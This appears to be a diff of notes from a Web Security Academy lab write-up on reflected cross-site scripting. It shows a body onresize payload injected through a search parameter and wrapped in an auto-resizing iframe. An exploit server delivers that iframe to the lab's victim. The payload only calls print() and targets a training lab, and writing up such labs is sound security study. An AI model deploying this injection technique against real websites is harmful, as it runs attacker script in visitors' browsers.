@@ -7,9 +7,10 @@ so we used an available exploit server to host the webpage inside an iframe tag
 with onload attribute and width attribute inline css.
 
 
-<iframe src="https://0a9c00fe0460d30d84fdf9ea00520014.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.width="100px"></iframe> 
+//payload
+<body onresize="print()" onload=this.style.width="100px"> 
 
 
 /deliver exploit to victim/
-
+<iframe src="https://0a9c00fe0460d30d84fdf9ea00520014.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.width="100px"></iframe> 
 
